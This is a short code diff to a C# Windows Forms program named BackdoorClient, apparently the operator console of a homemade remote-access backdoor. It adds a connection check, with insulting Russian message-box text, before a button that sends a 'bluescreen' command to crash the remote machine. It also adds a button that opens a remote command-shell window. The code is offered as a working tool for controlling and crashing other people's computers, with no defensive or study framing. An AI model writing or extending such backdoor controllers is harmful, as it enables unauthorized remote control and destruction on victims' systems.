@@ -155,6 +155,11 @@ namespace BackdoorClient
 
         private void crashSysButton_Click(object sender, EventArgs e)
         {
+            if (!this.TestConnect())
+            {
+                MessageBox.Show("Дебил нет связи, подключись!", "Мамка твоя", MessageBoxButtons.OK, MessageBoxIcon.Error);
+                return;
+            }
             var responce = MessageBox.Show("Внимание, вы точно хотите крашнуть уд. систему? Могут быть не обратимые последстивия", "Разраб проги", MessageBoxButtons.YesNo, MessageBoxIcon.Warning);
             if (responce != DialogResult.Yes) return;
             SendCommandAndGetResponce("bluescreen");
@@ -174,6 +179,12 @@ namespace BackdoorClient
 
             sockSender = null;
             connText.Text = "Не подключено";
+        }
+
+        private void CmdButton_Click(object sender, EventArgs e)
+        {
+            RemouteCmd remouteCmd = new RemouteCmd(this);
+            remouteCmd.Show();
         }
     }
 }
